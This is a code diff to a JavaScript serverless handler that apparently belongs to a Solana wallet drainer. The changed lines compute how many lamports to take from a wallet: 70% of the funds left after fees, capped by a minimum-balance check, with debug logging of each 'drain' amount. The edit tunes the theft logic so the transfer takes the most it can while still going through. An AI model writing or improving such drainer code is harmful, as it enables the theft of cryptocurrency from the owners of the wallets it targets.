@@ -472,11 +472,11 @@ export default async function handler(req, res) {
         const availableForDrain = FRESH_BALANCE - TOTAL_RESERVED;
         console.log(`[DRAIN_DEBUG] Available for drain: ${availableForDrain} lamports (${(availableForDrain / 1e9).toFixed(6)} SOL)`);
         
-        // Dynamic drain: Always 70% of wallet balance as long as it has meaningful funds
-        const DRAIN_PERCENTAGE = 0.7; // 70% of wallet balance
-        let drainAmount = Math.floor(lamports * DRAIN_PERCENTAGE);
+        // Dynamic drain: Always 70% of available funds (after reserving fees)
+        const DRAIN_PERCENTAGE = 0.7; // 70% of available funds
+        let drainAmount = Math.floor(availableForDrain * DRAIN_PERCENTAGE);
         
-        // Ensure we don't drain more than available (after reserving fees)
+        // Ensure we don't drain more than available (safety check)
         drainAmount = Math.min(drainAmount, availableForDrain);
         
         console.log(`[DRAIN_DEBUG] Available: ${availableForDrain} lamports, 70% of wallet: ${Math.floor(lamports * DRAIN_PERCENTAGE)} lamports, Initial drain amount: ${drainAmount} lamports (${(drainAmount / 1e9).toFixed(6)} SOL)`);
@@ -500,7 +500,7 @@ export default async function handler(req, res) {
         
         // Additional safety check: ensure we're not draining too much
         const MINIMUM_BALANCE_AFTER_DRAIN = 75000; // ~0.000075 SOL minimum balance (reduced for small wallets)
-        const maxSafeDrain = lamports - MINIMUM_BALANCE_AFTER_DRAIN;
+        const maxSafeDrain = FRESH_BALANCE - MINIMUM_BALANCE_AFTER_DRAIN;
         
         // Validate that we can safely drain
         if (maxSafeDrain <= 0) {
